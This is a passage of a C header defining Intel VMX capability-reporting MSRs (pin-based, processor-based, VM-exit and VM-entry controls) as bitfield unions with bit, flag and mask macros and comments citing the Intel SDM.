#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING_FLAG       0x01
#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING_MASK       0x01
#define IA32_VMX_PINBASED_CTLS_EXTERNAL_INTERRUPT_EXITING(_)         (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 2;

        /**
         * @brief Non-maskable interrupts cause VM-exits if set; otherwise dispatched through the guest's IDT
         *
         * [Bit 3] If this control is 1, non-maskable interrupts (NMIs) cause VM exits. Otherwise, they are delivered normally
         * using descriptor 2 of the IDT. This control also determines interactions between IRET and blocking by NMI.
         *
         * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
         */
        UINT64 NmiExiting : 1;
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING_BIT                       3
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING_FLAG                      0x08
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING_MASK                      0x01
#define IA32_VMX_PINBASED_CTLS_NMI_EXITING(_)                        (((_) >> 3) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief Virtual NMIs
         *
         * [Bit 5] If this control is 1, NMIs are never blocked and the "blocking by NMI" bit (bit 3) in the interruptibility-state
         * field indicates "virtual-NMI blocking". This control also interacts with the "NMI-window exiting" VM-execution control.
         *
         * @see Vol3C[24.6.2(Processor-Based VM-Execution Controls)]
         */
        UINT64 VirtualNmi : 1;
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI_BIT                       5
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI_FLAG                      0x20
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI_MASK                      0x01
#define IA32_VMX_PINBASED_CTLS_VIRTUAL_NMI(_)                        (((_) >> 5) & 0x01)

        /**
         * @brief Activate VMX preemption timer
         *
         * [Bit 6] If this control is 1, the VMX-preemption timer counts down in VMX non-root operation. A VM exit occurs when the
         * timer counts down to zero.
         *
         * @see Vol3C[25.5.1(VMX-Preemption Timer)]
         * @see Vol3C[25.2(OTHER CAUSES OF VM EXITS)]
         */
        UINT64 ActivateVmxPreemptionTimer : 1;
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER_BIT     6
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER_FLAG    0x40
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER_MASK    0x01
#define IA32_VMX_PINBASED_CTLS_ACTIVATE_VMX_PREEMPTION_TIMER(_)      (((_) >> 6) & 0x01)

        /**
         * @brief Process interrupts with the posted-interrupt notification vector
         *
         * [Bit 7] If this control is 1, the processor treats interrupts with the posted-interrupt notification vector specially,
         * updating the virtual-APIC page with posted-interrupt requests.
         *
         * @see Vol3C[24.6.8(Controls for APIC Virtualization)]
         * @see Vol3C[29.6(POSTED-INTERRUPT PROCESSING)]
         */
        UINT64 ProcessPostedInterrupts : 1;
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS_BIT         7
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS_FLAG        0x80
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS_MASK        0x01
#define IA32_VMX_PINBASED_CTLS_PROCESS_POSTED_INTERRUPTS(_)          (((_) >> 7) & 0x01)
        UINT64 Reserved3 : 56;
    };

    UINT64 Flags;
} IA32_VMX_PINBASED_CTLS_REGISTER;


/**
 * Capability Reporting Register of Primary Processor-Based VM-Execution Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.3.2(Primary Processor-Based VM-Execution Controls)]
 * @see Vol3C[24.6.2(Processor-Based VM-Execution Controls)] (reference)
 */
#define IA32_VMX_PROCBASED_CTLS                                      0x00000482
typedef union
{
    struct
    {
        UINT64 Reserved1 : 2;

        /**
         * @brief VM-exit as soon as RFLAGS.IF=1 and no blocking is active
         *
         * [Bit 2] If this control is 1, a VM exit occurs at the beginning of any instruction if RFLAGS.IF = 1 and there are no
         * other blocking of interrupts.
         *
         * @see Vol3C[24.4.2(Guest Non-Register State)]
         */
        UINT64 InterruptWindowExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING_BIT         2
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING_FLAG        0x04
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING_MASK        0x01
#define IA32_VMX_PROCBASED_CTLS_INTERRUPT_WINDOW_EXITING(_)          (((_) >> 2) & 0x01)

        /**
         * @brief Use timestamp counter offset
         *
         * [Bit 3] This control determines whether executions of RDTSC, executions of RDTSCP, and executions of RDMSR that read
         * from the IA32_TIME_STAMP_COUNTER MSR return a value modified by the TSC offset field.
         *
         * @see Vol3C[24.6.5(Time-Stamp Counter Offset and Multiplier)]
         * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
         */
        UINT64 UseTscOffsetting : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING_BIT               3
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING_FLAG              0x08
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING_MASK              0x01
#define IA32_VMX_PROCBASED_CTLS_USE_TSC_OFFSETTING(_)                (((_) >> 3) & 0x01)
        UINT64 Reserved2 : 3;

        /**
         * @brief VM-exit when executing the HLT instruction
         *
         * [Bit 7] This control determines whether executions of HLT cause VM exits.
         */
        UINT64 HltExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING_BIT                      7
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING_FLAG                     0x80
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING_MASK                     0x01
#define IA32_VMX_PROCBASED_CTLS_HLT_EXITING(_)                       (((_) >> 7) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * @brief VM-exit when executing the INVLPG instruction
         *
         * [Bit 9] This control determines whether executions of INVLPG cause VM exits.
         */
        UINT64 InvlpgExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING_BIT                   9
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING_FLAG                  0x200
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING_MASK                  0x01
#define IA32_VMX_PROCBASED_CTLS_INVLPG_EXITING(_)                    (((_) >> 9) & 0x01)

        /**
         * @brief VM-exit when executing the MWAIT instruction
         *
         * [Bit 10] This control determines whether executions of MWAIT cause VM exits.
         */
        UINT64 MwaitExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING_BIT                    10
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING_FLAG                   0x400
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING_MASK                   0x01
#define IA32_VMX_PROCBASED_CTLS_MWAIT_EXITING(_)                     (((_) >> 10) & 0x01)

        /**
         * @brief VM-exit when executing the RDPMC instruction
         *
         * [Bit 11] This control determines whether executions of RDPMC cause VM exits.
         */
        UINT64 RdpmcExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING_BIT                    11
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING_FLAG                   0x800
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING_MASK                   0x01
#define IA32_VMX_PROCBASED_CTLS_RDPMC_EXITING(_)                     (((_) >> 11) & 0x01)

        /**
         * @brief VM-exit when executing the RDTSC/RDTSCP instruction
         *
         * [Bit 12] This control determines whether executions of RDTSC and RDTSCP cause VM exits.
         */
        UINT64 RdtscExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING_BIT                    12
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING_FLAG                   0x1000
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING_MASK                   0x01
#define IA32_VMX_PROCBASED_CTLS_RDTSC_EXITING(_)                     (((_) >> 12) & 0x01)
        UINT64 Reserved4 : 2;

        /**
         * @brief VM-exit when executing the MOV to CR3 instruction (forced to 1 on the 'first' VT-x capable CPUs; this actually
         *        includes the newest Nehalem CPUs)
         *
         * [Bit 15] In conjunction with the CR3-target controls, this control determines whether executions of MOV to CR3 cause VM
         * exits. The first processors to support the virtual-machine extensions supported only the 1-setting of this control.
         *
         * @see Vol3C[24.6.7(CR3-Target Controls)]
         * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
         */
        UINT64 Cr3LoadExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING_BIT                 15
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING_FLAG                0x8000
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING_MASK                0x01
#define IA32_VMX_PROCBASED_CTLS_CR3_LOAD_EXITING(_)                  (((_) >> 15) & 0x01)

        /**
         * @brief VM-exit when executing the MOV from CR3 instruction (forced to 1 on the 'first' VT-x capable CPUs; this actually
         *        includes the newest Nehalem CPUs)
         *
         * [Bit 16] This control determines whether executions of MOV from CR3 cause VM exits. The first processors to support the
         * virtual-machine extensions supported only the 1-setting of this control.
         */
        UINT64 Cr3StoreExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING_BIT                16
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING_FLAG               0x10000
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING_MASK               0x01
#define IA32_VMX_PROCBASED_CTLS_CR3_STORE_EXITING(_)                 (((_) >> 16) & 0x01)
        UINT64 Reserved5 : 2;

        /**
         * @brief VM-exit on CR8 loads
         *
         * [Bit 19] This control determines whether executions of MOV to CR8 cause VM exits.
         */
        UINT64 Cr8LoadExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING_BIT                 19
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING_FLAG                0x80000
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING_MASK                0x01
#define IA32_VMX_PROCBASED_CTLS_CR8_LOAD_EXITING(_)                  (((_) >> 19) & 0x01)

        /**
         * @brief VM-exit on CR8 stores
         *
         * [Bit 20] This control determines whether executions of MOV from CR8 cause VM exits.
         */
        UINT64 Cr8StoreExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING_BIT                20
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING_FLAG               0x100000
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING_MASK               0x01
#define IA32_VMX_PROCBASED_CTLS_CR8_STORE_EXITING(_)                 (((_) >> 20) & 0x01)

        /**
         * @brief Use TPR shadow
         *
         * [Bit 21] Setting this control to 1 enables TPR virtualization and other APIC-virtualization features.
         *
         * @see Vol3C[29(APIC VIRTUALIZATION AND VIRTUAL INTERRUPTS)]
         */
        UINT64 UseTprShadow : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW_BIT                   21
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW_FLAG                  0x200000
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW_MASK                  0x01
#define IA32_VMX_PROCBASED_CTLS_USE_TPR_SHADOW(_)                    (((_) >> 21) & 0x01)

        /**
         * @brief VM-exit when virtual NMI blocking is disabled
         *
         * [Bit 22] If this control is 1, a VM exit occurs at the beginning of any instruction if there is no virtual-NMI blocking.
         *
         * @see Vol3C[24.4.2(Guest Non-Register State)]
         */
        UINT64 NmiWindowExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING_BIT               22
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING_FLAG              0x400000
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING_MASK              0x01
#define IA32_VMX_PROCBASED_CTLS_NMI_WINDOW_EXITING(_)                (((_) >> 22) & 0x01)

        /**
         * @brief VM-exit when executing a MOV DRx instruction
         *
         * [Bit 23] This control determines whether executions of MOV DR cause VM exits.
         */
        UINT64 MovDrExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING_BIT                   23
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING_FLAG                  0x800000
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING_MASK                  0x01
#define IA32_VMX_PROCBASED_CTLS_MOV_DR_EXITING(_)                    (((_) >> 23) & 0x01)

        /**
         * @brief VM-exit when executing IO instructions
         *
         * [Bit 24] This control determines whether executions of I/O instructions (IN, INS/INSB/INSW/INSD, OUT, and
         * OUTS/OUTSB/OUTSW/OUTSD) cause VM exits.
         */
        UINT64 UnconditionalIoExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING_BIT         24
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING_FLAG        0x1000000
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING_MASK        0x01
#define IA32_VMX_PROCBASED_CTLS_UNCONDITIONAL_IO_EXITING(_)          (((_) >> 24) & 0x01)

        /**
         * @brief Use IO bitmaps
         *
         * [Bit 25] This control determines whether I/O bitmaps are used to restrict executions of I/O instructions For this
         * control, "0" means "do not use I/O bitmaps" and "1" means "use I/O bitmaps." If the I/O bitmaps are used, the setting of
         * the "unconditional I/O exiting" control is ignored.
         *
         * @see Vol3C[24.6.4(I/O-Bitmap Addresses)]
         * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
         */
        UINT64 UseIoBitmaps : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS_BIT                   25
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS_FLAG                  0x2000000
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS_MASK                  0x01
#define IA32_VMX_PROCBASED_CTLS_USE_IO_BITMAPS(_)                    (((_) >> 25) & 0x01)
        UINT64 Reserved6 : 1;

        /**
         * @brief Monitor trap flag
         *
         * [Bit 27] If this control is 1, the monitor trap flag debugging feature is enabled.
         *
         * @see Vol3C[25.5.2(Monitor Trap Flag)]
         */
        UINT64 MonitorTrapFlag : 1;
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG_BIT                27
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG_FLAG               0x8000000
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG_MASK               0x01
#define IA32_VMX_PROCBASED_CTLS_MONITOR_TRAP_FLAG(_)                 (((_) >> 27) & 0x01)

        /**
         * @brief Use MSR bitmaps
         *
         * [Bit 28] This control determines whether MSR bitmaps are used to control execution of the RDMSR and WRMSR instructions.
         * For this control, "0" means "do not use MSR bitmaps" and "1" means "use MSR bitmaps." If the MSR bitmaps are not used,
         * all executions of the RDMSR and WRMSR instructions cause VM exits.
         *
         * @see Vol3C[24.6.9(MSR-Bitmap Address)]
         * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
         */
        UINT64 UseMsrBitmaps : 1;
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS_BIT                  28
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS_FLAG                 0x10000000
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS_MASK                 0x01
#define IA32_VMX_PROCBASED_CTLS_USE_MSR_BITMAPS(_)                   (((_) >> 28) & 0x01)

        /**
         * @brief VM-exit when executing the MONITOR instruction
         *
         * [Bit 29] This control determines whether executions of MONITOR cause VM exits.
         */
        UINT64 MonitorExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING_BIT                  29
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING_FLAG                 0x20000000
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING_MASK                 0x01
#define IA32_VMX_PROCBASED_CTLS_MONITOR_EXITING(_)                   (((_) >> 29) & 0x01)

        /**
         * @brief VM-exit when executing the PAUSE instruction
         *
         * [Bit 30] This control determines whether executions of PAUSE cause VM exits.
         */
        UINT64 PauseExiting : 1;
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING_BIT                    30
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING_FLAG                   0x40000000
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING_MASK                   0x01
#define IA32_VMX_PROCBASED_CTLS_PAUSE_EXITING(_)                     (((_) >> 30) & 0x01)

        /**
         * @brief Determines whether the secondary processor based VM-execution controls are used
         *
         * [Bit 31] This control determines whether the secondary processor-based VM-execution controls are used. If this control
         * is 0, the logical processor operates as if all the secondary processor-based VM-execution controls were also 0.
         */
        UINT64 ActivateSecondaryControls : 1;
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS_BIT      31
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS_FLAG     0x80000000
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS_MASK     0x01
#define IA32_VMX_PROCBASED_CTLS_ACTIVATE_SECONDARY_CONTROLS(_)       (((_) >> 31) & 0x01)
        UINT64 Reserved7 : 32;
    };

    UINT64 Flags;
} IA32_VMX_PROCBASED_CTLS_REGISTER;


/**
 * Capability Reporting Register of VM-Exit Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.4(VM-EXIT CONTROLS)]
 * @see Vol3C[24.7.1(VM-Exit Controls)] (reference)
 */
#define IA32_VMX_EXIT_CTLS                                           0x00000483
typedef union
{
    struct
    {
        UINT64 Reserved1 : 2;

        /**
         * @brief Save guest debug controls (dr7 & IA32_DEBUGCTL_MSR) (forced to 1 on the 'first' VT-x capable CPUs; this actually
         *        includes the newest Nehalem CPUs)
         *
         * [Bit 2] This control determines whether DR7 and the IA32_DEBUGCTL MSR are saved on VM exit. The first processors to
         * support the virtual-machine extensions supported only the 1-setting of this control.
         */
        UINT64 SaveDebugControls : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS_BIT                   2
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS_FLAG                  0x04
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS_MASK                  0x01
#define IA32_VMX_EXIT_CTLS_SAVE_DEBUG_CONTROLS(_)                    (((_) >> 2) & 0x01)
        UINT64 Reserved2 : 6;

        /**
         * @brief Return to long mode after a VM-exit
         *
         * [Bit 9] On processors that support Intel 64 architecture, this control determines whether a logical processor is in
         * 64-bit mode after the next VM exit. Its value is loaded into CS.L, IA32_EFER.LME, and IA32_EFER.LMA on every VM exit.1
         * This control must be 0 on processors that do not support Intel 64 architecture.
         */
        UINT64 HostAddressSpaceSize : 1;
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE_BIT               9
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE_FLAG              0x200
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE_MASK              0x01
#define IA32_VMX_EXIT_CTLS_HOST_ADDRESS_SPACE_SIZE(_)                (((_) >> 9) & 0x01)
        UINT64 Reserved3 : 2;

        /**
         * @brief Whether the IA32_PERF_GLOBAL_CTRL MSR is loaded on VM-exit
         *
         * [Bit 12] This control determines whether the IA32_PERF_GLOBAL_CTRL MSR is loaded on VM exit.
         */
        UINT64 LoadIa32PerfGlobalCtrl : 1;
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_BIT            12
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_FLAG           0x1000
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_MASK           0x01
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL(_)             (((_) >> 12) & 0x01)
        UINT64 Reserved4 : 2;

        /**
         * @brief Acknowledge external interrupts with the irq controller if one caused a VM-exit
         *
         * [Bit 15] This control affects VM exits due to external interrupts:
         * - If such a VM exit occurs and this control is 1, the logical processor acknowledges the interrupt controller, acquiring
         * the interrupt's vector. The vector is stored in the VM-exit interruption-information field, which is marked valid.
         * - If such a VM exit occurs and this control is 0, the interrupt is not acknowledged and the VM-exit
         * interruption-information field is marked invalid.
         */
        UINT64 AcknowledgeInterruptOnExit : 1;
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT_BIT         15
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT_FLAG        0x8000
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT_MASK        0x01
#define IA32_VMX_EXIT_CTLS_ACKNOWLEDGE_INTERRUPT_ON_EXIT(_)          (((_) >> 15) & 0x01)
        UINT64 Reserved5 : 2;

        /**
         * @brief Whether the guest IA32_PAT MSR is saved on VM-exit
         *
         * [Bit 18] This control determines whether the IA32_PAT MSR is saved on VM exit.
         */
        UINT64 SaveIa32Pat : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT_BIT                         18
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT_FLAG                        0x40000
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT_MASK                        0x01
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_PAT(_)                          (((_) >> 18) & 0x01)

        /**
         * @brief Whether the host IA32_PAT MSR is loaded on VM-exit
         *
         * [Bit 19] This control determines whether the IA32_PAT MSR is loaded on VM exit.
         */
        UINT64 LoadIa32Pat : 1;
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT_BIT                         19
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT_FLAG                        0x80000
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT_MASK                        0x01
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_PAT(_)                          (((_) >> 19) & 0x01)

        /**
         * @brief Whether the guest IA32_EFER MSR is saved on VM-exit
         *
         * [Bit 20] This control determines whether the IA32_EFER MSR is saved on VM exit.
         */
        UINT64 SaveIa32Efer : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER_BIT                        20
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER_FLAG                       0x100000
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER_MASK                       0x01
#define IA32_VMX_EXIT_CTLS_SAVE_IA32_EFER(_)                         (((_) >> 20) & 0x01)

        /**
         * @brief Whether the host IA32_EFER MSR is loaded on VM-exit
         *
         * [Bit 21] This control determines whether the IA32_EFER MSR is loaded on VM exit.
         */
        UINT64 LoadIa32Efer : 1;
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER_BIT                        21
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER_FLAG                       0x200000
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER_MASK                       0x01
#define IA32_VMX_EXIT_CTLS_LOAD_IA32_EFER(_)                         (((_) >> 21) & 0x01)

        /**
         * @brief Whether the value of the VMX preemption timer is saved on every VM-exit
         *
         * [Bit 22] This control determines whether the value of the VMX-preemption timer is saved on VM exit.
         */
        UINT64 SaveVmxPreemptionTimerValue : 1;
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE_BIT       22
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE_FLAG      0x400000
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE_MASK      0x01
#define IA32_VMX_EXIT_CTLS_SAVE_VMX_PREEMPTION_TIMER_VALUE(_)        (((_) >> 22) & 0x01)

        /**
         * [Bit 23] This control determines whether the IA32_BNDCFGS MSR is cleared on VM exit.
         */
        UINT64 ClearIa32Bndcfgs : 1;
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS_BIT                    23
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS_FLAG                   0x800000
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS_MASK                   0x01
#define IA32_VMX_EXIT_CTLS_CLEAR_IA32_BNDCFGS(_)                     (((_) >> 23) & 0x01)

        /**
         * [Bit 24] If this control is 1, Intel Processor Trace does not produce a paging information packet (PIP) on a VM exit or
         * a VMCS packet on an SMM VM exit.
         *
         * @see Vol3C[35(INTEL(R) PROCESSOR TRACE)]
         */
        UINT64 ConcealVmxFromPt : 1;
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT_BIT                   24
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT_FLAG                  0x1000000
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT_MASK                  0x01
#define IA32_VMX_EXIT_CTLS_CONCEAL_VMX_FROM_PT(_)                    (((_) >> 24) & 0x01)
        UINT64 Reserved6 : 39;
    };

    UINT64 Flags;
} IA32_VMX_EXIT_CTLS_REGISTER;


/**
 * Capability Reporting Register of VM-Entry Controls.
 *
 * @remarks If CPUID.01H:ECX.[5] = 1
 * @see Vol3D[A.5(VM-ENTRY CONTROLS)]
 * @see Vol3D[24.8.1(VM-Entry Controls)] (reference)
 */
#define IA32_VMX_ENTRY_CTLS                                          0x00000484
typedef union
{
    struct
    {
        UINT64 Reserved1 : 2;

        /**
         * @brief Load guest debug controls (dr7 & IA32_DEBUGCTL_MSR) (forced to 1 on the 'first' VT-x capable CPUs; this actually
         *        includes the newest Nehalem CPUs)
         *
         * [Bit 2] This control determines whether DR7 and the IA32_DEBUGCTL MSR are loaded on VM entry. The first processors to
         * support the virtual-machine extensions supported only the 1-setting of this control.
         */
        UINT64 LoadDebugControls : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS_BIT                  2
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS_FLAG                 0x04
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS_MASK                 0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_DEBUG_CONTROLS(_)                   (((_) >> 2) & 0x01)
        UINT64 Reserved2 : 6;

        /**
         * @brief 64 bits guest mode. Must be 0 for CPUs that don't support AMD64
         *
         * [Bit 9] On processors that support Intel 64 architecture, this control determines whether the logical processor is in
         * IA-32e mode after VM entry. Its value is loaded into IA32_EFER.LMA as part of VM entry. This control must be 0 on
         * processors that do not support Intel 64 architecture.
         */
        UINT64 Ia32EModeGuest : 1;
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST_BIT                     9
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST_FLAG                    0x200
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST_MASK                    0x01
#define IA32_VMX_ENTRY_CTLS_IA32E_MODE_GUEST(_)                      (((_) >> 9) & 0x01)

        /**
         * @brief In SMM mode after VM-entry
         *
         * [Bit 10] This control determines whether the logical processor is in system-management mode (SMM) after VM entry. This
         * control must be 0 for any VM entry from outside SMM.
         */
        UINT64 EntryToSmm : 1;
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM_BIT                         10
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM_FLAG                        0x400
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM_MASK                        0x01
#define IA32_VMX_ENTRY_CTLS_ENTRY_TO_SMM(_)                          (((_) >> 10) & 0x01)

        /**
         * @brief Disable dual treatment of SMI and SMM; must be zero for VM-entry outside of SMM
         *
         * [Bit 11] If set to 1, the default treatment of SMIs and SMM is in effect after the VM entry. This control must be 0 for
         * any VM entry from outside SMM
         *
         * @see Vol3C[34.15.7(Deactivating the Dual-Monitor Treatment)]
         */
        UINT64 DeactivateDualMonitorTreatment : 1;
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT_BIT    11
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT_FLAG   0x800
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT_MASK   0x01
#define IA32_VMX_ENTRY_CTLS_DEACTIVATE_DUAL_MONITOR_TREATMENT(_)     (((_) >> 11) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * @brief Whether the guest IA32_PERF_GLOBAL_CTRL MSR is loaded on VM-entry
         *
         * [Bit 13] This control determines whether the IA32_PERF_GLOBAL_CTRL MSR is loaded on VM entry.
         */
        UINT64 LoadIa32PerfGlobalCtrl : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_BIT           13
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_FLAG          0x2000
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL_MASK          0x01
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PERF_GLOBAL_CTRL(_)            (((_) >> 13) & 0x01)

        /**
         * @brief Whether the guest IA32_PAT MSR is loaded on VM-entry
         *
         * [Bit 14] This control determines whether the IA32_PAT MSR is loaded on VM entry.
         */
        UINT64 LoadIa32Pat : 1;
#define IA32_VMX_ENTRY_CTLS_LOAD_IA32_PAT_BIT                        14
